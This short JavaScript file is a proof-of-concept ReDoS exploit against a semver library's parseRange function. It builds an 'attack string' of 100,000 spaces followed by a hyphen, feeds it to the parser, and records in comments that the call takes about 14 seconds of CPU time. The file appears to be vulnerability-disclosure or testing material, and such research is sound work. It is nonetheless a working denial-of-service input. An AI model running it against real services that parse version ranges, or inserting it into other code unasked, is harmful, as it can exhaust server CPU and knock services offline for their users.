const { parseRange } = require("./semver.js");

//Attack String :""+" "*100000+"-"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "-";

var result = parseRange(str);

// real    0m14.108s
// user    0m14.063s
// sys     0m0.010s
